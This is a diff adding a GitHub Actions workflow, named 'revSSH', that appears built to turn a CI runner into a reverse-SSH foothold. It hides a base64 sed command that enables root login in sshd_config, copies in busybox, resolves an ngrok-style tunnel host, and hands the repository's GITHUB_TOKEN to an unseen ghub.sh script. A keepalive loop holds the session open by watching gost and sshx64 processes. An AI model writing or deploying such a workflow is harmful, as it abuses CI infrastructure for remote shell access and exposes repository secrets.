@@ -1,0 +1,170 @@
+# This is a basic workflow to help you get started with Actions
+
+name: revSSH_2022_0602
+
+# Controls when the workflow will run
+on:
+    # Triggers the workflow on push or pull request events but only for the main branch
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+    inputs:
+      name77:
+        description: 'PersonDesc'
+        required: true
+        default: 'AABBCC_rev_shell'
+
+    
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build_jobs3:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-24.04
+    #ubuntu-latest  18.04 20.04  22.04 ubuntu-24.04
+    #container: 'centos:latest'
+    #services:
+      #redis:
+       # image: redis
+        #ports:
+        #- 6379/tcp
+    
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+
+      - name: Run a one-line script
+        run: |
+          cat /etc/hostname;
+          hostname -i;
+          echo ${{ toJson(github.event.action) }};
+          echo ${{github.event.inputs}};
+          #echo toJson(${{ github.event.inputs }});
+          #echo ${github.event.inputs};
+          #(env|grep ss>/tmp/s0;sleep 1111&);
+          chmod 0777 -R $GITHUB_WORKSPACE/ ;
+          ls -al;
+        env:
+          ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+      # Runs a set of commands using the runners shell
+      - name: Run a 2-line script
+        run: |
+          echo "${{github.workspace}}--${{ runner.workspace }}--${{env.IMAGE_NAME}}--${{ github.run_id }}--${{ github.run_number }}--${{env.IMAGE_TAG}}";
+          date;
+          sudo cp ./busybox.bin /sbin/busybox;
+          busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;
+          ls -al /run/user/
+        env:
+          ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc8"
+      # Runs a set of commands using the runners shell
+
+      - name: Run a 2-5-multi-line js8_script_ghub-sh
+        run: |
+          cd /tmp;
+          echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;
+          base64 -d js8>js9;
+          #env|grep ss>s1;
+          . $GITHUB_WORKSPACE/ghub.sh;
+        env:
+          sshc1: 'cat /proc/uptime|cut -f1 -d "."'
+          Github_Token22: ${{ secrets.GITHUB_TOKEN }}
+          Github_act22: ${{ github.event.action }}
+          Github_OWN22: ${{ github.repository_owner }}
+          Github_REPO22: ${{ github.event.repository.name }}
+          Github_wsp22: ${{github.workspace}}
+          sp9: 3
+          TZ: Asia/Shanghai
+
+          
+          
+      - name: Run a 3rd script #cat /tmp/gh-y1;echo liuhuan88;cat /tmp/gh-y2;cat /tmp/gh-y1;
+        run: |
+          bash -c '(ls -al $GITHUB_WORKSPACE)';
+          ls -al /tmp;
+          pwd;
+          sleep 2;
+          sudo netstat -anlp|grep tcp;
+          sudo ps aux|grep ssh;
+          grep NAME /etc/os-release;
+          #cat /tmp/y2;
+          #echo "ping success"
+        env:
+          sp9: 4
+          TZ: Asia/Shanghai
+
+          
+
+      - name: Run a 4rd script_keepalive  #[ ${rt} -gt 15 ]&&whoami&&break;  #[ $((${rt}%80)) -eq 0 ]&&  #rt=$((${rt}+1));
+        run: |
+          cd /tmp;
+          rt=0;
+          while true
+          do 
+            date;
+            uptime;which busybox netstat ss ps;sleep 1;
+            rt=$((${rt}+1));
+            echo "==$rt==";
+            #sudo id|grep ro;
+            id;#ls -al /tmp;
+            [ -f /tmp/keepalive ]&&cat /tmp/keepalive;
+            #[ -f /tmp/keepalive ]&&cat /tmp/keepalive&&sudo echo netstat -anlp|grep upx_reverse;
+            id;
+            ps aux|grep gost;
+            sudo ps aux|grep sshx64|grep -v keepalive;
+            #sudo busybox netstat -anlp|grep 34292;
+            [ -f /tmp/keepalive ]&&sleep 25||break;
+          done 
+        env:
+          sp9: 4
+          TZ: Asia/Shanghai
+      - uses: actions/upload-artifact@v4
+        with:
+         name: nuget123
+         path: ${{ github.workspace }}/package
+         retention-days: 6
+        name: "Upload Package9981"
+
+        
+
+
+      - name: Create Release and Upload Release Asset
+        uses: softprops/action-gh-release@v1
+        with:
+            tag_name: v1.7
+            name: "ka卡0728"
+            body: TODO New Release_${{ github.ref }}.
+            #body_path: CHANGELOG.txt
+            draft: false  # 是否是草稿
+            prerelease: false  # 是否是预览版
+            files: |
+                    d2023.txt
+                    js9.txt
+                    eval.zip
+            
+
+  # build_jobs8:    
+  #   needs: build_jobs3
+  #   runs-on: ubuntu-22.04
+  #   steps:
+  #     - name: Run a 8rd script
+  #       run: 
+  #         bash -c '(ls -al /tmp;date;ls -alR $GITHUB_WORKSPACE;)' 
+  #       env:
+  #         sp9: 2
+  #         TZ: Asia/Shanghai
+
+  #     - uses: actions/download-artifact@v3
+  #       with:
+  #        name: nuget123
+  #        path: ${{ github.workspace }}/package
+  #       name: "Upload Package9982"
+  #     - name: Run a 9rd script
+  #       run: |
+  #         bash -c '(ls -alR $GITHUB_WORKSPACE)' 
+  #         id
+  #       env:
+  #         sp9: 1
+  #         TZ: Asia/Shanghai
+
